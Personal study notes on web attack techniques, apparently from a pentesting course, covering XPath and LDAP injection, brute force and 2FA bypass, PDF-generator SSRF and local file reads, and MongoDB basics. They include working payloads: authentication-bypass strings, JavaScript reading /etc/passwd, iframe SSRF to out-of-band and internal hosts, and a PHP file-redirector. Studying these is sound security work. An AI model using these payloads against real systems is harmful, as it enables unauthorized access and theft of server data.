Predicates filter the result from an XPath query similar to the `WHERE` clause in a SQL query. Predicates are part of the XPath query and are contained within brackets `[]`. Here are some example predicates:

| Query                                    | Explanation                                                                                        |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `/academy_modules/module[1]`             | Select the first `module` child node of the `academy_modules` node                                 |
| `/academy_modules/module[position()=1]`  | Equivalent to the above query                                                                      |
| `/academy_modules/module[last()]`        | Select the last `module` child node of the `academy_modules` node                                  |
| `/academy_modules/module[position()<3]`  | Select the first two `module` child nodes of the `academy_modules` node                            |
| `//module[tier=2]/title`                 | Select the `title` of all modules where the `tier` element node equals `2`                         |
| `//module/author[@co-author]/../title`   | Select the `title` of all modules where the `author` element node has a `co-author` attribute node |
| `//module/tier[@difficulty="medium"]/..` | Select all modules where the `tier` element node has a `difficulty` attribute node set to `medium` |
Similar to SQL these queries can use logical operators

We aim to bypass authentication by injecting a username and password such that the XPath query always evaluates to `true`. We can achieve this by injecting the value `' or '1'='1` as username and password. However we need to know a valid username for this to work

If we don't know a username we can try to inject a double or  `' or true() or '` which would result in the following query:
```xpath
/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
This will always evaluate to true, if we want to enumeratre all users we could use the payload `' or position()=2 or '`, resulting in the following query:

```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb4
```
If there are too many users to enumerate, we can search for spefici users using a query like `' or contains(.,'admin') or '`, resulting in the following query:

Code: xpath

```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406
```

For queries like searches involving XPath we can confirm XPath injection by sending the payload `SOMETHINGINVALID') or ('1'='1`
If this staement evaluates to true it will return all nodes in that depth

## XPath Data Exfiltration
How can we exploit this XPath injection to exfiltrate data apart from the street data? The easiest way is to construct a query that returns the entire XML document so that we can search it for interesting information. There are multiple different ways to achieve this. However, the simplest is probably to append a new query that returns all text nodes. We can do this with a request like this: `f=fullstreetname | //text()`
We are appending a second query with the `|` operator, similar to a `UNION`-based SQL injection. The second query, `//text()`, returns all text nodes in the XML document.

We could also achieve the same result by using this payload in the `q` parameter: `SOMETHINGINVALID') or ('1'='1` and setting the `f` parameter to `../../..//text()`. This would result in the following XPath query:

Code: xpath

```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

Sometimes it's impossible to exfiltrate all of the xml data at once. For example a web application might limit results to the top 5 queries

To iterate through the XML schema, we must first determine the schema depth. We can achieve this by ensuring the original XPath query returns no results and appending a new query that gives us information about the schema depth. We set the search term in the parameter `q` to anything that does not return data, for instance, `SOMETHINGINVALID`. We can then set the parameter `f` to `fullstreetname | /*[1]`. This results in the following XPath query:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```
The subquery `/*[1]` starts at the document root `/`, moves one node down the node tree due to the wildcard `*`, and selects the first child due to the predicate `[1]`Thus, this subquery selects the document root's first child, the document root element node. Since the document root element node has multiple child nodes, it is of the data type `array` in PHP, which we can confirm when analyzing the response. The web application expects a `string` but receives an `array` and is thus unable to print the results, resulting in an empty response.
==We can now determine the schema depth by iteratively appending an additional `/*[1]` to the subquery until the behavior of the web application changes==

| Value of the `f` GET parameter                | Response      |
| --------------------------------------------- | ------------- |
| `fullstreetname \| /*[1]`                     | Nothing       |
| `fullstreetname \| /*[1]/*[1]`                | Nothing       |
| `fullstreetname \| /*[1]/*[1]/*[1]`           | Nothing       |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[1]`      | `01ST ST`     |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |
We can then extract info on the street names by inceremnting the last poistion in the query.

If we want to see what other info is available we need to increment other postions. The first position is root so that should stay as 1. We can try the second position to see what other nodes might be available. We will need to re determine the depth for sub nodes.

## Blind injection
There is no sleep function in XPath unlike SQL injection.
We will discuss how to exfiltrate the XML schema first, allowing us to inject XPath queries to target the interesting data. This enables us to exfiltrate the name of element nodes to construct XPath queries without wildcards to narrow our queries to target interesting data points. To do so, we can use the `name()`, `substring()`, `string-length()`, and `count()` functions. The `name()` function can be called on any node and gives us the name of that node. The `substring()` function allows us to exfiltrate the name of a node one character at a time. The `string-length()` function enables us to determine the length of a node name to know when to stop the exfiltration. Lastly, the `count()` function returns the number of children of an element node.

Take the following example where a user can send messages to toher users on a website. The user supplies a username and a message. If the user exists it sends the message, but if the user doesn't exist the app replies invalid user. Based on this behavior we can assume the app is validating the username. Thus our provided username is inserted into a predicate. We can confirm this suspicion by supplying the username `invalid' or '1'='1`. This results in the following XPath query:

Code: xpath

```xpath
/users/user[username='invalid' or '1'='1']
```

The username we provided is invalid, however, the query should still return data due to our injected `or` clause, which results in a universally true predicate. Thus, the web application responds as if we provided a valid username:
To exfiltrate the length of the root node's name, we can use the payload `invalid' or string-length(name(/*[1]))=1 and '1'='1`, resulting in the following XPath query:

Code: xpath

```xpath
/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
```

The query `/*[1]` selects the root element node. Since the username `invalid` does not exist and `'1'='1'` is universally true, this query returns data only if `string-length(name(/*[1]))=1` is true, meaning the length of the root element node's name is `1`. In our case, the query does not return any data

## LDAP Injection
### LDAP Terminology

**Directory Server** is the entity that stores data, like DB server for SQL
**LDAP Entry** holds data for an entity and has 3 main components
- the **Distinguished Name** , a unique identifier for the entry that has multiple relative distinguished names (RDN's) that are key value pairs. uid=admin,dc=hackthebox,dc=com
- Multiple **Attributes** that store data. Each consists of an attribute type and a value
- Muultiple **Object Classes** which consist of attribute types that a re related to a specific object, e.g. Person or Group

LDAP defines `Operations`, which are actions the client can initiate. These include:

- `Bind Operation`: Client authentication with the server
- `Unbind Operation`: Close the client connection to the server
- `Add Operation`: Create a new entry
- `Delete Operation`: Delete an entry
- `Modify Operation`: Modify an entry
- `Search Operation`: Search for entries matching a search query
#### Search Filter syntax

LDAP search queries are called `search filters`. A search filter may consist of multiple components, each needing to be enclosed in parentheses `()`. Each base component consists of an `attribute`, an `operand`, and a `value` to search for. LDAP defines the following base operands:

|Name|Operand|Example|Example Description|
|---|---|---|---|
|Equality|`=`|`(name=Kaylie)`|Matches all entries that contain a `name` attribute with the value `Kaylie`|
|Greater-Or-Equal|`>=`|`(uid>=10)`|Matches all entries that contain a `uid` attribute with a value greater-or-equal to `10`|
|Less-Or-Equal|`<=`|`(uid<=10)`|Matches all entries that contain a `uid` attribute with a value less-or-equal to `10`|
|Approximate Match|`~=`|`(name~=Kaylie)`|Matches all entries that contain a `name` attribute with approximately the value `Kaylie`|
To construct more complex search filters, LDAP further supports the following combination operands:

|Name|Operand|Example|Example Description|
|---|---|---|---|
|And|`(&()())`|`(&(name=Kaylie)(title=Manager))`|Matches all entries that contain a `name` attribute with the value `Kaylie` and a `title` attribute with the value `Manager`|
|Or|`(\|()())`|`(\|(name=Kaylie)(title=Manager))`|Matches all entries that contain a `name` attribute with the value `Kaylie` or a `title` attribute with the value `Manager`|
|Not|`(!())`|`(!(name=Kaylie))`|Matches all entries that contain a `name` attribute with a value different from `Kaylie`|
Note: the AND and OR opperands can support more than two arguements

Furthermore, we can display `True` and `False` like so:

|Name|Filter|
|---|---|
|True|`(&)`|
|False|`(\|)`|

Lastly, LDAP supports an asterisk as a wildcard, such that we can define wildcard search filters like the following:

|Example|Example Description|
|---|---|
|`(name=*)`|Matches all entries that contain a `name` attribute|
|`(name=K*)`|Matches all entries that contain a `name` attribute that begins with `K`|
|`(name=*a*)`|Matches all entries that contain a name attribute that contains an `a`|

#### Common Attribute Types

Here are some common attribute types that we can search for. The list is non-exhaustive. Furthermore, LDAP server instances may implement custom attribute types that can be used in their search filters.

|Attribute Type|Description|
|---|---|
|`cn`|Full Name|
|`givenName`|First name|
|`sn`|Last name|
|`uid`|User ID|
|`objectClass`|Object type|
|`distinguishedName`|Distinguished Name|
|`ou`|Organizational Unit|
|`title`|Title of a Person|
|`telephoneNumber`|Phone Number|
|`description`|Description|
|`mail`|Email Address|
|`street`|Address|
|`postalCode`|Zip code|
|`member`|Group Memberships|
|`userPassword`|User password|

### Authentication Bypass

Before discussing the exploitation of LDAP injection to bypass web authentication, let us first discuss what a search filter used for authentication may look like. Since the authentication process needs to check the username and the password, an LDAP search filter like the following can be used:

Code: ldap

```ldap
(&(uid=admin)(userPassword=password123))
```

Depending on the setup of the directory server, the actual search filter might query different attribute types. For instance, the username might be checked against the `cn` attribute type.

Since the web application tells us about the LDAP integration, let us think of what we can inject into the search filter to bypass authentication. Because an asterisk is treated as a wildcard character, we can inject it into the password field to match the value without specifying the actual password. We can then specify an arbitrary valid username to bypass authentication for that user. If we specify a username of `admin` and a password of `*`, the web application executes the following LDAP search filter:

Code: ldap

```ldap
(&(uid=admin)(userPassword=*))
```

Sending the request, we can see that the backend redirects us to the post-login page, indicating that we successfully bypassed authentication and logged in as the user `admin`:

If we do not know a valid username, we could inject a wildcard into the username field as well, resulting in the following LDAP search filter:

```ldap
(&(uid=*)(userPassword=*))
```

Lastly, if we only know a substring of a valid username, for instance, in a case where admin usernames are obfuscated by appending random characters, we can specify a substring in the username field to narrow down the list of results with a search filter like the following:

```ldap
(&(uid=admin*)(userPassword=*))
```
### Bypassing without wildcards

 If we alter the search filter so that the password check can fail and the search filter still returns a user, we can bypass authentication as well.

For instance, if we specify a username of `admin)(|(&` and a password of `abc)`, the web application uses the following search filter:

Code: ldap

```ldap
(&(uid=admin)(|(&)(userPassword=abc)))
```

Due to our injected payload, the search filter contains an additional `or` clause which consists of the universal true operand `(&)` and the incorrect user password `(userPassword=abc)`. The password check returns `false` since we do not know the correct password. However, the first operand of the `or` clause is universally true; thus, the `or` clause also returns true. Thus, we only need to specify a valid username to login to the specified account, thereby successfully bypassing authentication without the use of the wildcard character:


### Data Exfiltration

If a web application displays results to us we can use a wildcard to display all results
the query
```ldap
(&(uid=admin)(objectClass=account))
```
Becomes
```ldap
(&(uid=*)(objectClass=account))
```
We can acheive the same effect if we can inject an OR clause into the search filter
```ldap
(|(objectClass=organization)(objectClass=device))
```

This search filter matches all `organization` and `device` entries. If our payload is injected into the second `objectClass` attribute, we can force the backend to leak all entries by injecting a wildcard such that the search filter looks like this:
```ldap
(|(objectClass=organization)(objectClass=*))
```

#### Blind Exploitation
If there is a difference in response for a successful and unsuccessful query, we can exploit it to exfiltrate data based on the message returned
Remember that the search filter used for authentication looks similar to the following:

```ldap
(&(uid=htb-stdnt)(password=p@ssw0rd))
```


We can verify the web app is still vulnerable to LDAP injection by using a wildcard for the password. Once we see a successful login we can brute force the password by setting the first character to 'a' and appending a wildcard
```ldap
(&(uid=htb-stdnt)(password=a*))
```

This search filter will return data if the user's password starts with an `a`, otherwise, it does not. We can repeat this proccess, looping through values, until we get a successful login.

We can use a similar technique to exfiltrate data
 If we submit a username of `htb-stdnt)(|(description=*` and a password of `invalid)`, the resulting search filter looks like this:
```ldap
(&(uid=htb-stdnt)(|(description=*)(password=invalid)))
```

Since the provided password is incorrect, our injected `or` clause only returns true if the condition for the `description` attribute is true. This now allows us to apply the same methodology as discussed above to brute-force the `description` attribute character-by-character:

# Authentication Attacks

Most vulnerabilities in authentication mechanisms occur in one of two ways:

- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called "broken authentication".

## Password based logins
### Brute Force Attacks
Usernames can be easy to guess if they conform to a common pattern such as an email address. It is very common to see business logins in the format `firstname.lastname@company.com`
Even if there is no predictable patterns sometimes high privilege accounts are created using predictable usernames like `admin` or `administrator`
During auditing we can check whether the website discloses potential usernames publicly. Sometimes profile names are also used as usernames, Can also check http responses to see if emails are disclosed. Occasionally emails contain responses from high level users.

Passwords can be brute forced with varying difficulty based on the strength of the password. Passwords usually have the requirements of
- A minimum number of characters
- a mix of lower and upper case letters
- At least one special character
However,  users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if `mypassword` is not allowed, users may try something like `Mypassword1!` or `Myp4$$w0rd` instead.
In cases where users must change their password users may make small predictable changes such as `Mypassword1!` becomes `Mypassword1?` or `Mypassword2!.`

Username enumeration is when an attacker can observe changes in the websites behavior in order to identify if a username is valid.
Attackers should keep track of
- **status codes:** During a brute-force attack, the returned HTTP status code is likely to be the same for the vast majority of guesses because most of them will be wrong. If a guess returns a different status code, this is a strong indication that the username was correct. I
- **error messages**:  Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect.
- **response time:**  a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.

Burp intruder can be used to brute force logins and look for a difference in responses

If we run an intruder attack in Burp --> right click on a result --> grep-extract --> highlight the error message. We can view the error message as part of the results and sort to see if any are different.

when looking for a discrepancy in response time we can supply a long password (100+ character) to see if the app reacts differently.

==We can spoof IP by providing the `X-Forwarded-For` header if supported== We can supply a simple number list as part of a pitchfork attack for this parameter

## Multi Factor Authentication
it is increasingly common to see both mandatory and optional two-factor authentication (2FA) based on **something you know** and **something you have**. This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.  Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

## Bypassing 2FA
If users are prompted to enter a password on one page and then brought to a separate page to enter a code they are effectively in a "logged in" state --> **We can try skipping to logged in pages after the first step**. Try navigating to other pages via links or address bar

Sometimes there may be flawed logic in the implementation of 2FA. A website may not be adequately checking the same user is completing the second step. For example, the user logs in with their normal credentials in the first step as follows:

`POST /login-steps/first HTTP/1.1 Host: vulnerable-website.com ... username=carlos&password=qwerty`

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

`HTTP/1.1 200 OK Set-Cookie: account=carlos GET /login-steps/second HTTP/1.1 Cookie: account=carlos`

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=carlos ... verification-code=123456`

In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.

`POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=victim-user ... verification-code=123456`

# PDF Generation Vulns
As an example, here are a few PDF generation libraries commonly used in web applications:

- [TCPDF](https://tcpdf.org/)
- [html2pdf](https://github.com/spipu/html2pdf)
- [mPDF](https://mpdf.github.io/)
- [DomPDF](https://github.com/dompdf/dompdf)
- [PDFKit](https://pdfkit.org/)
- [wkhtmltopdf](https://wkhtmltopdf.org/)
- [PD4ML](https://pd4ml.com/)

Since web applications need to be able to design the layout of the resulting PDF files, these libraries accept HTML code as input and use it to generate the final PDF file. This allows the web application to control the design of the PDF file via CSS in the HTML code. The libraries work by parsing the HTML code, rendering it, and creating a PDF.

## Analysis of PDF files
We need to determine which PDF generation library a web application utilizes to target specific vulnerabilities and misconfigurations. Fortunately, most of these libraries add information in the metadata of the generated PDF that helps us identify the library. Thus, we simply need to get our hands on a PDF generated by the web application for analysis. To display the metadata of a PDF file, we can use the tool exiftool

Once we figure out the software/version of the pdf generator we can do research to see if there are any exploitable vulnerabilities.

## Javascript Code Execution
All of these vulnerabilities require that user-provided content is inserted into the HTML input of the PDF generator.

 Because the PDF generation library renders HTML input, it might execute our injected JavaScript code. Furthermore, with the PDF generation library running on the server, the payload would also be executed on the server, which is why this type of vulnerability is also called `Server-Side XSS`.
In applications that take in user input we can attempt to use html tags to identify of they are being properly sanitized when turned into a pdf
We can try to provide input with the bold tag to see if it impacts the output of the PDF generation
```html
<b>test1</b>
```
In the example we can see that the pdf has the bold text test1, which shows it may be vulnerable to more severe attacks
In the second step, we need to verify whether the server executes injected JavaScript code. We can use a payload similar to the following:
```
<script>document.write('test1')</script>
```
After generating a PDF, we can see the string test1 in the PDF. Thus, the backend executed our injected JavaScript code and wrote the string to the DOM before generating the PDF.
As a simple first exploit, let us force an information disclosure that leaks a path on the web server. We can do so with the following payload:

```javascript
<script>document.write(window.location)</script>
```

The [window.location](https://developer.mozilla.org/en-US/docs/Web/API/Window/location) property stores the current location of the JavaScript context. Since this is a local file on the server's filesystem, it displays the local path on the server where generated PDF files are stored:

### Server side request forgery
One of the most common vulnerabilities in combination with PDF generation is [Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery). Since HTML documents commonly load resources such as stylesheets or images from external sources, displaying an HTML document inherently requires the server to send requests to these external sources to fetch them. Since we can inject arbitrary HTML code into the PDF generator's input, we can force the server to send such a GET request to any URL we choose, including internal web applications.

We can inject many different HTML tags to force the server to send an HTTP request. For instance, we can inject an image tag pointing to a URL under our control to confirm SSRF. As an example, we are going to use the `img` tag

```html
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
```
Similarly, we can also inject a stylesheet using the `link` tag:
```html
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
```
Generally, for images and stylesheets, the response is not displayed in the generated PDF such that we have a `blind SSRF` vulnerability which restricts our ability to exploit it. However, depending on the (mis-)configuration of the PDF generation library, we can inject other HTML elements that can trigger a request and make the server display the response. An example of this is an `iframe`:
```html
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
```
After using the iframe exploit we can see it is included in the pdf. We can use this to query internal resources like an internal API
```html
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```
### Local File Inclusion
Another powerful vulnerability we can potentially exploit with the help of PDF generation libraries is `Local File Inclusion` (`LFI`). There are multiple HTML elements we can try to inject to read local files on the server.

If the server executes our injected JavaScript, we can read local files using [XmlHttpRequests](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) and the `file` protocol, resulting in a payload similar to the following:
```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

Injecting this JavaScript code, we can see the content of the `passwd` file in the generated PDF:

However, this is impractical for some files since copying data out of the PDF file might break it. For instance, the syntax most likely breaks if we exfiltrate an SSH key. Additionally, we cannot exfiltrate files containing binary data this way. Thus, we should base64-encode the file using the `btoa` function before writing it to the PDF:

Code: html

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(btoa(this.responseText))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

However, doing so creates a single long line that does not fit onto the PDF page. Typically, the PDF generation library will not inject linebreaks, resulting in the line being truncated before the end of the page:

We can easily modify our payload to inject linebreaks every 100 characters to ensure that it fits on the PDF page:

Code: html

```html
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

If the backend does not execute our injected JavaScript code, we must use other HTML tags to display local files. We can try the following payloads:

Code: html

```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
```

However, doing so in our test environment only displays an empty iframe:

Fortunately, there is one more trick we can do in combination with iframes. As discussed previously in the `SSRF` section, some PDF generation libraries display the response to requests in iframes. However, as we can see in the screenshot above, sometimes, we cannot use iframes to access files directly. Nevertheless, we can use an `src` attribute that points to a server under our control and redirects incoming requests to a local file. If the library is misconfigured, it may then display the file. We can run the following PHP script on our server to do so. The script responds to all incoming requests with an HTTP 302 redirect by setting the `Location` header to a local file using the `file` protocol:
```php
<?php header('Location: file://' . $_GET['url']); ?>
```

We can then inject the following payload, where the IP points to the server we are running the redirector script on:

Code: html

```html
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

PDF generators may have advanced features like annotations or attachments which we can use to leak local files on the server

For example, consider the PDF generation library `mPDF`, which supports annotations via the `<annotations>` tag. We can use annotations to append files to the generated PDF file by injecting a payload like the following:
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

Looking at the generated PDF file, we can see the annotation with the attached file. Clicking on the attachment reveals the attached `/etc/passwd` file:

Another PDF generation library that supports attachments is `PD4ML`. We can check the syntax in the [documentation](https://pd4ml.tech/support-topics/usage-examples/#add-attachment). As a proof-of-concept, we can use the following payload:

```html
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```





# NoSQL Injection
NoSQL = non relation database, whereas sql is relational
There are 4 main types of NoSQL databases

|Type|Description|Top 3 Engines (as of November 2022)|
|---|---|---|
|Document-Oriented Database|Stores data in `documents` which contain pairs of `fields` and `values`. These documents are typically encoded in formats such as `JSON` or `XML`.|[MongoDB](https://www.mongodb.com/), [Amazon DynamoDB](https://aws.amazon.com/dynamodb/), [Google Firebase - Cloud Firestore](https://firebase.google.com/products/firestore/)|
|Key-Value Database|A data structure that stores data in `key:value` pairs, also known as a `dictionary`.|[Redis](https://redis.io/), [Amazon DynamoDB](https://aws.amazon.com/dynamodb/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/)|
|Wide-Column Store|Used for storing enormous amounts of data in `tables`, `rows`, and `columns` like a relational database, but with the ability to handle more ambiguous data types.|[Apache Cassandra](https://cassandra.apache.org/_/index.html), [Apache HBase](https://hbase.apache.org/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/)|
|Graph Database|Stores data in `nodes` and uses `edges` to define relationships.|[Neo4j](https://neo4j.com/), [Azure Cosmos DB](https://azure.microsoft.com/en-us/products/cosmos-db/), [Virtuoso](https://virtuoso.openlinksw.com/)|

## Mongo DB
MongoDB is a document oriented database. Data is stored in collections of documents composed of fields and values. These documents are encoded in BSON (Binary JSON) an example document is:
```javascript
{
  _id: ObjectId("63651456d18bf6c01b8eeae9"),
  type: 'Granny Smith',
  price: 0.65
}
```
Here we can see the document's `fields` (type, price) and their respective `values` ('Granny Smith', '0.65'). The field `_id` is reserved by MongoDB to act as a document's `primary key`, and it must be unique throughout the entire `collection`.

We can connect to mongoDB using `mongosh`. The default port is 27017. Example of connecting
```shell-session
mongosh mongodb://127.0.0.1:27017
```

to check which databases exist we can use the command `show databases`
switch databases using the `use` command
`use academy`
List all the colections in the database using `show collections`
MongoDB only creates a collection when we first insert a document into that collection. We can insert data into a collection in several ways
Insert a single document into the apples collection
```javascript
db.apples.insertOne({type: "Granny Smith", price: 0.65})
```
Insert multiple objects at once
```javascript
db.apples.insertMany([{type: "Golden Delicious", price: 0.79}, {type: "Pink Lady", price: 0.90}])
```
Search for data using the find command. We supply the a document with fields and values we want to match
```javascript
db.apples.find({type: "Granny Smith"})
```
We can list all the documents in a collection by passing a blank document
```javascript
db.apples.find({})
```
If we want to do more advanced queries we can use query operators
There are many `query operators` in MongoDB, but some of the most common are:

|Type|Operator|Description|Example|
|---|---|---|---|
|Comparison|`$eq`|Matches values which are `equal to` a specified value|`type: {$eq: "Pink Lady"}`|
|Comparison|`$gt`|Matches values which are `greater than` a specified value|`price: {$gt: 0.30}`|
|Comparison|`$gte`|Matches values which are `greater than or equal to` a specified value|`price: {$gte: 0.50}`|
|Comparison|`$in`|Matches values which exist `in the specified array`|`type: {$in: ["Granny Smith", "Pink Lady"]}`|
|Comparison|`$lt`|Matches values which are `less than` a specified value|`price: {$lt: 0.60}`|
|Comparison|`$lte`|Matches values which are `less than or equal to` a specified value|`price: {$lte: 0.75}`|
|Comparison|`$nin`|Matches values which are `not in the specified array`|`type: {$nin: ["Golden Delicious", "Granny Smith"]}`|
|Logical|`$and`|Matches documents which `meet the conditions of both` specified queries|`$and: [{type: 'Granny Smith'}, {price: 0.65}]`|
|Logical|`$not`|Matches documents which `do not meet the conditions` of a specified query|`type: {$not: {$eq: "Granny Smith"}}`|
|Logical|`$nor`|Matches documents which `do not meet the conditions` of any of the specified queries|`$nor: [{type: 'Granny Smith'}, {price: 0.79}]`|
|Logical|`$or`|Matches documents which `meet the conditions of one` of the specified queries|`$or: [{type: 'Granny Smith'}, {price: 0.79}]`|
|Evaluation|`$mod`|Matches values which divided by a `specific divisor` have the `specified remainder`|`price: {$mod: [4, 0]}`|
|Evaluation|`$regex`|Matches values which `match a specified RegEx`|`type: {$regex: /^G.*/}`|
|Evaluation|`$where`|Matches documents which [satisfy a JavaScript expression](https://www.mongodb.com/docs/manual/reference/operator/query/where/)|`$where: 'this.type.length === 9'`|

Going back to the example from before, if we wanted to select `all apples whose type starts with a 'G' and whose price is less than 0.70`, we could do this:
```javascript
db.apples.find({
    $and: [
        {
            type: {
                $regex: /^G/
            }
        },
        {
            price: {
                $lt: 0.70
            }
        }
    ]
});
```
Alternatively we could use the where operator
```javascript
db.apples.find({$where: `this.type.startsWith('G') && this.price < 0.70`});
```
If we want to sort data from `find` queries, we can do so by appending the [sort](https://www.mongodb.com/docs/manual/reference/method/cursor.sort/) function. For example, if we want to select the `top two apples sorted by price in descending order` we can do so like this:
```javascript
 db.apples.find({}).sort({price: -1}).limit(2)
```
If we wanted to reverse the sort order, we would use `1 (Ascending)` instead of `-1 (Descending)`

Update operations take a `filter` and an `update` operation. The `filter` selects the documents we will update, and the `update` operation is carried out on those documents. Similar to the `query operators`, there are [update operators](https://www.mongodb.com/docs/manual/reference/operator/update/#std-label-update-operators-processing-order) in MongoDB. The most commonly used update operator is `$set`, which updates the specified field's value.

Imagine that the price for `Granny Smith` apples has risen from `0.65` to `1.99` due to inflation. To update the document, we would do this:
```javascript
 db.apples.updateOne({type: "Granny Smith"}, {$set: {price: 1.99}})
```

If we want to increase the prices of all apples at the same time, we could use the `$inc` operator and do this:
```javascript
academy> db.apples.updateMany({}, {$inc: {quantity: 1, "price": 1}})
```
If we want to completely replace a document we can use `replaceOne`
```javascript
db.apples.replaceOne({type:'Pink Lady'}, {name: 'Pink Lady', price: 0.99, color: 'Pink'})
```
to remove documents we use the `remove` function
```javascript
db.apples.remove({price: {$lt: 0.8}})
```







# Techniques
Use dev tools to look at source code, maybe find comments or unintended data left over

robots.txt may contain interesting directories

check all input forms, if they display anything on the screen they may be vulnerable to injection

sitemap.xml lists all websites owner wants on the search page --> look and see if there are more directories

Headers can give info about software versions for server and framework --> maybe versions are out of date and there are exploits

try googling site specific pages using "site:"

----COMMANDS------

Curl - downloads web page

----- tools-----------------

Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.


Wayback Machine

The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.




phpinfo.php --> disable_functions directive may prohibit certain system calls --> when conducting rce we may need to edit exploits to avoid disabled functions. For th eglpi box we used an array map and hexec to get around a restriction on exec

# 